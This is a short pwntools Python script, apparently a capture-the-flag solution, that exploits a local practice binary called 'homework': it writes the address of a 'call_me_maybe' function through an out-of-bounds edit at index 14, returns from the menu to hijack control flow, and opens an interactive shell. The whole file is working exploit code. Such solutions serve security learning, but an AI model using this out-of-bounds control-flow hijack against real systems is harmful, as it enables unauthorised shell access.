#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = 'debug')

elf = ELF("./homework")
sh_addr = elf.symbols['call_me_maybe']

io = process("./homework")

io.sendlineafter("name? ", "M4x")
io.sendlineafter("\n > ", '1')
io.sendlineafter("edit: ", '14')
io.sendlineafter("many? ", str(sh_addr))
io.sendlineafter("\n > ", '0')

io.interactive()
io.close()
